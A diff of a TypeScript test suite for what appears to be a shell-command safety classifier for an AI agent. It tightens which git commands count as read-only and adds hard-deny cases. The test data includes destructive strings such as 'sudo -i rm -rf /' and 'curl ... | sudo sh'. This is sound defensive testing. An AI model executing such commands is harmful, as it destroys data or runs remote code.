@@ -78,11 +78,11 @@ describe('readonly-allowlist: every segment must be side-effect free', () => {
     ['pwd', true], ['ls -lah src', true], ['cat README.txt', true],
     ['head -n 20 file.txt', true], ['tail -n 5 file.txt', true], ['wc -l file.txt', true],
     ['grep -n pattern file.txt', true], ['rg --files src', true], ['stat file.txt', true],
-    ['find src -type f -name "*.ts"', true], ['git status --short', true],
-    ['git --no-pager diff --no-ext-diff --no-textconv --stat', true],
-    ['git --no-pager log --no-ext-diff --no-textconv -5 --oneline', true],
-    ['git --no-pager show --no-ext-diff --no-textconv HEAD:README.txt', true],
-    ['git --no-pager status', true], ['ls | head && pwd; wc file.txt', true],
+    ['find src -type f -name "*.ts"', true], ['git status --short', false],
+    ['git --no-pager diff --no-ext-diff --no-textconv --stat', false],
+    ['git --no-pager log --no-ext-diff --no-textconv -5 --oneline', false],
+    ['git --no-pager show --no-ext-diff --no-textconv HEAD:README.txt', false],
+    ['git --no-pager status', false], ['ls | head && pwd; wc file.txt', true],
     ['sort file.txt', true], ['uniq file.txt', true], ['file document.txt', true],
     ['ls | rm -rf x', false], ['ls; touch x', false], ['ls && npm install', false],
     ['find . -delete', false], ['find . -exec rm {} \\;', false],
@@ -118,7 +118,7 @@ describe('readonly-allowlist: every segment must be side-effect free', () => {
   });
 });
 
-describe('git helper execution requires explicit disable guarantees', () => {
+describe('git readonly exemption is limited to helper-free metadata queries', () => {
   it.each([
     'git diff -- src/example.bin',
     'git log -5 --oneline',
@@ -141,22 +141,42 @@ describe('git helper execution requires explicit disable guarantees', () => {
     'git --paginate diff --no-ext-diff --no-textconv',
     'git --no-pager diff --no-ext-diff --no-textconv --textconv',
     'git --no-pager diff --no-ext-diff --no-textconv --ext-diff',
-  ])('does not exempt helper-capable %j', (text) => {
+    'git --no-pager log --no-ext-diff --no-textconv -p -- src/example.bin',
+    'git --no-pager show --no-ext-diff --no-textconv HEAD -- src/example.bin',
+    'git --no-pager grep pattern',
+    'git --no-pager rev-parse HEAD',
+    'git --no-pager rev-parse --shared-index-path',
+    'git --no-pager rev-parse --show-toplevel HEAD',
+    'git --no-pager rev-parse --show-toplevel --help',
+    'git rev-parse --show-toplevel',
+  ])('does not exempt helper-capable or unaudited %j', (text) => {
     expect(isReadonlyCommand(text)).toBe(false);
     expect(isReadonlyCommand(command(text), undefined, { project_dir: '/project', workdir: '/project' })).toBe(false);
   });
 
   it.each([
-    'git --no-pager diff --no-ext-diff --no-textconv -- src/example.bin',
-    'git --no-pager log --no-ext-diff --no-textconv -p -- src/example.bin',
-    'git --no-pager show --no-ext-diff --no-textconv HEAD -- src/example.bin',
-  ])('preserves explicitly helper-disabled %j', (text) => {
+    'git --no-pager rev-parse --show-toplevel',
+    'git --no-pager rev-parse --show-prefix',
+    'git --no-pager rev-parse --is-inside-work-tree',
+    'git --no-pager rev-parse --is-bare-repository',
+    'git --no-pager rev-parse --show-toplevel --is-inside-work-tree',
+  ])('preserves audited metadata-only %j', (text) => {
     expect(isReadonlyCommand(text)).toBe(true);
     expect(isReadonlyCommand(command(text), undefined, { project_dir: '/project', workdir: '/project' })).toBe(true);
   });
 
-  it.each(['git status --short', 'git --no-pager status --short'])('preserves safe status %j with known context', (text) => {
-    expect(isReadonlyCommand(command(text), undefined, { project_dir: '/project', workdir: '/project' })).toBe(true);
+  it.each([
+    'git status',
+    'git status --short',
+    'git --no-pager status --short',
+    'git --no-pager diff --no-ext-diff --no-textconv',
+    'git --no-pager diff --no-ext-diff --no-textconv -- src/example.bin',
+    'git --no-pager ls-files --modified',
+    'git --no-pager ls-files --deleted',
+  ])('requires review while fsmonitor or index/worktree filters are unknown in %j', (text) => {
+    // Classify text only: no repository hooks, filters, or helpers are installed or run.
+    expect(isReadonlyCommand(text)).toBe(false);
+    expect(isReadonlyCommand(command(text), undefined, { project_dir: '/project', workdir: '/project' })).toBe(false);
   });
 });
 
@@ -237,6 +257,50 @@ describe('wrapped execution remains inert but cannot bypass classification', () 
     expect(hardDeny(command(text))).toBe('root-home-delete');
   });
   it.each([
+    'sudo -i rm -rf /',
+    'sudo --login rm -rf /',
+    'sudo -s rm -rf /',
+    'sudo --shell rm -rf /',
+    'sudo -nu root rm -rf /',
+    'sudo -nuroot rm -rf /',
+    'sudo -Hnu root rm -rf /',
+    'sudo -iu root rm -rf /',
+    'sudo -su root rm -rf /',
+    'sudo -i env TARGET=/tmp/sh rm -rf /',
+    'sudo --login env TARGET=/tmp/cp rm -rf /',
+    'sudo -s env TARGET=/tmp/sh rm -rf /',
+    'sudo --shell env TARGET=/tmp/cp rm -rf /',
+    'sudo -nu root env TARGET=/tmp/sh rm -rf /',
+    'env TARGET=/tmp/sh sudo -nu root env OTHER=/tmp/cp rm -rf /',
+    'env TARGET=/tmp/cp sudo --login env OTHER=/tmp/sh rm -rf /',
+  ])('hard-denies actual rm through sudo modes and clusters in %j', (text) => {
+    expect(hardDeny(command(text))).toBe('root-home-delete');
+  });
+  it.each([
+    'sudo -i env TARGET=/tmp/sh rm -rf build',
+    'sudo --login env TARGET=/tmp/cp rm -rf build',
+    'sudo -s env TARGET=/tmp/sh rm -rf build',
+    'sudo --shell env TARGET=/tmp/cp rm -rf build',
+    'sudo -nu root env TARGET=/tmp/sh rm -rf build',
+    'env TARGET=/tmp/sh sudo -nu root env OTHER=/tmp/cp rm -rf build',
+    'sudo -i cat /tmp/sh -c "rm -rf /"',
+    'sudo -nu root env TARGET=/tmp/cp cat /tmp/sh -c "rm -rf /"',
+    'env TARGET=/tmp/sh sudo --shell cat /tmp/cp rm -rf /',
+  ])('preserves nonroot and operand-basename controls through sudo in %j', (text) => {
+    expect(hardDeny(command(text))).toBeUndefined();
+  });
+  it.each([
+    'sudo --unknown rm -rf /',
+    'sudo -nz rm -rf /',
+    'sudo -u',
+    'sudo -i',
+    'sudo -i env TARGET=/tmp/sh',
+    'env --unsupported TARGET=/tmp/cp rm -rf /',
+    'curl https://example.invalid/data | sudo --unknown sh',
+  ])('fails closed on unresolved wrapper execution in %j', (text) => {
+    expect(hardDeny(command(text))).toBe('unresolved-execution-wrapper');
+  });
+  it.each([
     'env TARGET=/tmp/sh rm -rf build',
     'env TARGET=/tmp/cp rm -rf build',
     'cat /tmp/sh -c "rm -rf /"',
@@ -288,11 +352,12 @@ describe('resolved policy reaches shell classification boundaries', () => {
     expect(isReadonlyCommand('find src -custom-write', policy)).toBe(false);
   });
   it('replaces Git command/option data without relaxing helper guarantees', () => {
-    const policy = resolvePolicy({ readonly_git_subcommands: ['status', 'diff'], git_unsafe_arguments: ['--short'] });
-    expect(isReadonlyCommand('git status --short', policy)).toBe(false);
-    expect(isReadonlyCommand('git --no-pager rev-parse HEAD', policy)).toBe(false);
-    expect(isReadonlyCommand('git diff', policy)).toBe(false);
-    expect(isReadonlyCommand('git --no-pager diff --no-ext-diff --no-textconv', policy)).toBe(true);
+    const policy = resolvePolicy({ readonly_git_subcommands: ['rev-parse', 'status', 'diff'], git_unsafe_arguments: ['--show-prefix'] });
+    expect(isReadonlyCommand('git --no-pager rev-parse --show-prefix', policy)).toBe(false);
+    expect(isReadonlyCommand('git --no-pager rev-parse --show-toplevel', policy)).toBe(true);
+    expect(isReadonlyCommand('git --no-pager rev-parse --show-toplevel', resolvePolicy({ readonly_git_subcommands: [] }))).toBe(false);
+    expect(isReadonlyCommand('git --no-pager status', policy)).toBe(false);
+    expect(isReadonlyCommand('git --no-pager diff --no-ext-diff --no-textconv', policy)).toBe(false);
   });
   it('uses resolved deny selectors, targets and patterns repeatedly', () => {
     const policy = resolvePolicy({
